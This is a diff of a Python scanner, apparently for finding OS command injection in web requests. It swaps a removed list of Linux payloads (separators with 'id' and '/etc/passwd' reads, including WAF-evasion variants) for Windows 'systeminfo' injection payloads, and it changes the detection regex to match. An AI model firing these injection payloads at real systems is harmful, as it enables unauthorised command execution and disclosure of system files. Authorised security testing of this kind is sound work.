@@ -15,78 +15,23 @@ init(autoreset=True)
 
 # Configuration
 OSI_PAYLOADS = [
-    '||id',
-    '|id',
-    ';id',
-    '&&id',
-    '&id',
-    '`id`',
-#    ';cat%20/etc/passwd',
-#    ';cat+/e${hahaha}tc/${heywaf}pas${catchthis}swd',
-#    ';cat$u+/etc$u/passwd$u',
-#    ';{cat,/etc/passwd}',
-#    ';cat</etc/passwd',
-#    ';cat$IFS/etc/passwd',
-#    ';echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd',
-#    ';/usr/bin/id;',
-#    '|cat%20/etc/passwd',
-#    '|cat+/e${hahaha}tc/${heywaf}pas${catchthis}swd',
-#    '|cat$u+/etc$u/passwd$u',
-#    '|{cat,/etc/passwd}',
-#    '|cat</etc/passwd',
-#    '|cat$IFS/etc/passwd',
-#    '|echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd',
-#    '|/usr/bin/id|',
-#    '||cat%20/etc/passwd',
-#    '||cat+/e${hahaha}tc/${heywaf}pas${catchthis}swd',
-#    '||cat$u+/etc$u/passwd$u',
-#    '||{cat,/etc/passwd}',
-#    '||cat</etc/passwd',
-#    '||cat$IFS/etc/passwd',
-#    '||echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd',
-#    '||/usr/bin/id||',
-#    '&&cat%20/etc/passwd',
-#    '&&cat+/e${hahaha}tc/${heywaf}pas${catchthis}swd',
-#    '&&cat$u+/etc$u/passwd$u',
-#    '&&{cat,/etc/passwd}',
-#    '&&cat</etc/passwd',
-#    '&&cat$IFS/etc/passwd',
-#    '&&echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd',
-#    '&&/usr/bin/id&&',
-#    '&cat%20/etc/passwd',
-#    '&cat+/e${hahaha}tc/${heywaf}pas${catchthis}swd',
-#    '&cat$u+/etc$u/passwd$u',
-#    '&{cat,/etc/passwd}',
-#    '&cat</etc/passwd',
-#    '&cat$IFS/etc/passwd',
-#    '&echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd',
-#    '&/usr/bin/id&',
-#    '%0acat%20/etc/passwd',
-#    '%0acat+/e${hahaha}tc/${heywaf}pas${catchthis}swd',
-#    '%0acat$u+/etc$u/passwd$u',
-#    '%0a{cat,/etc/passwd}',
-#    '%0acat</etc/passwd',
-#    '%0acat$IFS/etc/passwd',
-#    '%0aecho${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd',
-#    '%0a/usr/bin/id%0a',
-#    '`cat%20/etc/passwd`',
-#    '`cat+/e${hahaha}tc/${heywaf}pas${catchthis}swd`',
-#    '`cat$u+/etc$u/passwd$u`',
-#    '`{cat,/etc/passwd}`',
-#    '`cat</etc/passwd`',
-#    '`cat$IFS/etc/passwd`',
-#    '`echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd`',
-#    '`/usr/bin/id`',
-#    '$(cat%20/etc/passwd)',
-#    '$(cat+/e${hahaha}tc/${heywaf}pas${catchthis}swd)',
-#    '$(cat$u+/etc$u/passwd$u)',
-#    '$({cat,/etc/passwd})',
-#    '$(cat</etc/passwd)',
-#    '$(cat$IFS/etc/passwd)',
-#    '$(echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd)',
-#    '$(/usr/bin/id)',
-    'id'
+    "systeminfo",
+    "|systeminfo|",
+    ";systeminfo;",  # Might not work in pure cmd.exe but useful if backend uses PowerShell
+    "&systeminfo&",
+    "&&systeminfo&&",
+    "||systeminfo||",
+    "%26systeminfo%26",
+    "%26%26systeminfo%26%26",
+    "%7Csysteminfo%7C",
+    "%7C%7Csysteminfo%7C%7C",
+    "%0Asysteminfo",
+    "%0Dsysteminfo",
+    "%0D%0Asysteminfo",
+    "`systeminfo`",  # PowerShell / Unix-style
+    "$(systeminfo)"  # PowerShell / Unix-style
 ]
+
 DEFAULT_TIMEOUT = 50
 SEMAPHORE_LIMIT = 5  # concurrency limit
 
@@ -221,13 +166,12 @@ async def test_OSI(session, url, method, headers=None, data=None, json_data=None
         response = await session.request(method, url, headers=cleaned_headers, data=data, json=json_data, timeout=DEFAULT_TIMEOUT)
 
         # Look for /etc/passwd-like entries
-        if re.search(r'(uid|gid|groups)=[0-9]+\(.+?\)|[a-zA-Z_-]{1,}:x:[0-9]{1,}:[0-9]{1,}:', response.text):
+        if re.search(r'BIOS Version:', response.text):
             return {
                 "url": url,
                 "method": method,
                 "status_code": response.status_code,
-                "OSI_detected": True,
-                "response_excerpt": response.text[:1000]  # small excerpt for debugging
+                "OSI_detected": True
             }
         return {
             "url": url,
@@ -328,7 +272,7 @@ async def main(input_file, output_file):
 if __name__ == "__main__":
     parser = argparse = __import__("argparse").ArgumentParser(description="OSI Detection Tool")
     parser.add_argument("--input", default="requests.json", help="Input file with requests")
-    parser.add_argument("--output", default="OSI_linux.json", help="Output file for results")
+    parser.add_argument("--output", default="OSI_win.json", help="Output file for results")
     parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
     args = parser.parse_args()
 
